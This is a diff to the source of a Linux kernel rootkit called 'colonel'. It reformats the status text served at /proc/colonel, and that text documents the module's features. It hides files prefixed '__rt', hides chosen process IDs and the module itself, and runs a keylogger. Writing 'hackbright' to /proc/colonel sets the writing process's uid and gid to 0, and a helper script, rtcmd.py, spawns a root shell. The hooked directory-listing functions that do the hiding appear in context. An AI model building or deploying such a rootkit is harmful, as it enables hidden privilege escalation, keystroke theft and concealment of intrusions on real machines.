@@ -130,24 +130,23 @@ static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
 	og_fs_filldir = filldir;	/* comparable to the /proc version */
 	return og_fs_readdir(filp, dirent, new_fs_filldir);
 }
-
-static int read_colonel(char *buffer, char **buffer_location, off_t off, 
-					  int count, int *eof, void *data) {	/* reads /proc/colonel */
+/* reads /proc/colonel */
+static int read_colonel(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data) {
 	int size;
 
 	sprintf(module_status, 
-"COLONEL-----------------------------------------\n\n\
+"COLONEL-----------------------------------------\n\
 DESCRIPTION:\n\
   hides files prefixed with __rt or 10-__rt and gives root access\n\n\
 USAGE:\n\
-  From command line -- 
-  $ echo -n <command> >> /proc/colonel\n 
-  From rtcmd -- 
-  $ ./rtcmd.py hp1337\n\
-  To get root access, give the \"hackbright\" command and 
-  then fork some shell from writing process.\n
+  From command line --\n\
+  echo -n <command> >> /proc/colonel\n\
+  From rtcmd --\n\
+  ./rtcmd.py hp1337\n\
+  To get root access, give the \"hackbright\" command and\n\
+  then fork some shell from writing process.\n\
   rtcmd.py does this if the second parameter is specified. --\n\
-  $ ./rtcmd.py hackbright /bin/bash\n\n\
+  ./rtcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright	- uid and gid 0 for writing process\n\
   hpXXXX		- hides process id XXXX\n\
@@ -159,7 +158,7 @@ STATUS-------------------------------------------\n\
   keylogger: %d\n\
   hidden files: %d\n\
   hidden PIDs: %d\n\
-  hidden module: %d\n
+  hidden module: %d\n\
   -----------------------------------------------\n", key_logger, hidden_files, current_pid, hidden_module);
 
 	size = strlen(module_status);
